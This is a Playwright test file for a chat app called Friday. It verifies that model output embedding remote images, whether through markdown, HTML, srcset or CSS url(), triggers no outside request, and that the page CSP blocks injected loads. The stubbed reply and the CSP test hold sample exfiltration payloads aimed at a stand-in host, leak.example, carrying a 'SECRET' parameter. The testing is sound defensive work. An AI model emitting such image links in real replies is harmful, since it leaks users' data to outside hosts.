/**
 * Model and tool output never makes the browser fetch from outside.
 *
 * A reply that embeds a remote image (markdown, HTML, a reference link, a
 * protocol-relative address, srcset, CSS url()) must produce no request to that
 * host: the picture shows as a click-to-load placeholder that names the host.
 * The page CSP backs that up, so even a renderer slip is refused by the browser.
 * A click loads the picture through Friday's own server, and the page shows it
 * from a blob: URL.
 *
 * Read from a running scratch app, never the live one. The chat reply is
 * stubbed, so no model runs, and every outside request is recorded and
 * answered with a pixel so a leak is visible rather than a timeout.
 *
 *   FRIDAY_URL=http://localhost:3217 PW_CHANNEL=msedge npx playwright test tests/chat_no_remote_loads.spec.ts
 */
import { test, expect, type Page } from '@playwright/test';

const BASE = process.env.FRIDAY_URL || '';
if (process.env.PW_CHANNEL) test.use({ channel: process.env.PW_CHANNEL });
test.setTimeout(180000);
test.use({ viewport: { width: 1600, height: 1000 } });

const PIXEL = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');

const REPLY = [
  'markdown: ![a](https://leak.example/md?d=SECRET)',
  '',
  'protocol-relative: ![b](//leak.example/pr?d=SECRET)',
  '',
  'reference: ![c][r]',
  '',
  '[r]: https://leak.example/ref?d=SECRET',
  '',
  '<img src="https://leak.example/html?d=SECRET">',
  '',
  '<img srcset="https://leak.example/srcset?d=SECRET 2x" src="data:image/png;base64,' + PIXEL.toString('base64') + '">',
  '',
  '<div style="background:url(https://leak.example/css?d=SECRET)">css</div>',
  '',
  '<div style="background-image:image-set(\'https://leak.example/set?d=SECRET\' 1x)">image-set</div>',
  '',
  'local: ![d](/static/galaxy/star_glow.png)',
].join('\n');

async function boot(page: Page, leaks: string[]) {
  await page.route(/^https?:\/\/(?!(localhost|127\.0\.0\.1|\[::1\]))/, async r => {
    leaks.push(r.request().url());
    await r.fulfill({ status: 200, contentType: 'image/png', body: PIXEL });
  });
  page.on('request', q => { if (/leak\.example/.test(q.url())) leaks.push('seen:' + q.url()); });
  await page.route('**/api/chat/stream', async r => {
    const body = 'data: ' + JSON.stringify({ delta: 'x' }) + '\n\n'
      + 'data: ' + JSON.stringify({ done: true, payload: { response: REPLY, model: 'stub-model', seat: 'local' } }) + '\n\n';
    await r.fulfill({ status: 200, headers: { 'Content-Type': 'text/event-stream' }, body });
  });
  await page.route('**/api/work/forecast', r => r.fulfill({ status: 200, contentType: 'application/json', body: '{"will_pause":false}' }));
  await page.route('**/api/setup/status', r => r.fulfill({ status: 200, contentType: 'application/json', body: '{"initialized":true}' }));
  await page.route('**/api/privacy/cloud-consent', r => r.request().method() === 'GET'
    ? r.fulfill({ status: 200, contentType: 'application/json', body: '{"needs_prompt":false}' }) : r.continue());
  await page.goto(BASE + '/');
  await page.waitForSelector('.dock', { timeout: 90000 });
  await page.waitForTimeout(1500);
}

test.skip(!BASE, 'set FRIDAY_URL to a scratch server');

test('a reply with remote images makes no outside request and shows placeholders', async ({ page }) => {
  const leaks: string[] = [];
  await boot(page, leaks);
  const html = await page.evaluate((md: string) => (window as any).renderFridayMarkdown(md), REPLY);
  await page.evaluate((h: string) => {
    const d = document.createElement('div');
    d.id = 'exfil-probe';
    d.innerHTML = h;
    document.body.appendChild(d);
  }, html);
  await page.waitForTimeout(2000);
  expect(leaks, 'no request may leave the machine').toEqual([]);
  const probe = page.locator('#exfil-probe');
  await expect(probe.locator('.friday-remote-img').first()).toContainText('leak.example');
  await expect(probe.locator('img[src^="/static/galaxy/"]')).toHaveCount(1);
});

test('the page CSP refuses a remote image even if one is injected', async ({ page }) => {
  const leaks: string[] = [];
  await boot(page, leaks);
  const violations = await page.evaluate(() => new Promise<string[]>(resolve => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', e => seen.push(e.violatedDirective + ' ' + e.blockedURI));
    const img = new Image();
    img.src = 'https://leak.example/csp?d=SECRET';
    document.body.appendChild(img);
    const bg = document.createElement('div');
    bg.style.background = 'url(https://leak.example/cssbg?d=SECRET)';
    document.body.appendChild(bg);
    fetch('https://leak.example/fetch?d=SECRET').catch(() => {});
    setTimeout(() => resolve(seen), 1500);
  }));
  expect(leaks).toEqual([]);
  expect(violations.some(v => v.startsWith('img-src'))).toBeTruthy();
  expect(violations.some(v => v.startsWith('connect-src'))).toBeTruthy();
});

test('clicking the placeholder loads the picture through Friday and names the host', async ({ page }) => {
  const leaks: string[] = [];
  await boot(page, leaks);
  let asked = '';
  await page.route('**/api/remote-image', async r => {
    asked = JSON.parse(r.request().postData() || '{}').url;
    await r.fulfill({ status: 200, contentType: 'image/png', body: PIXEL });
  });
  await page.evaluate(() => {
    const d = document.createElement('div');
    d.id = 'exfil-probe';
    d.innerHTML = (window as any).renderFridayMarkdown('![a](https://pics.example/a.png?x=1)');
    document.body.appendChild(d);
  });
  const ph = page.locator('#exfil-probe .friday-remote-img');
  await expect(ph).toContainText('pics.example');
  await ph.click();
  const img = page.locator('#exfil-probe img');
  await expect(img).toHaveCount(1);
  expect(await img.getAttribute('src')).toMatch(/^blob:/);
  await expect(page.locator('#exfil-probe')).toContainText('Loaded from pics.example at your request');
  expect(asked).toBe('https://pics.example/a.png?x=1');
  expect(leaks).toEqual([]);
});
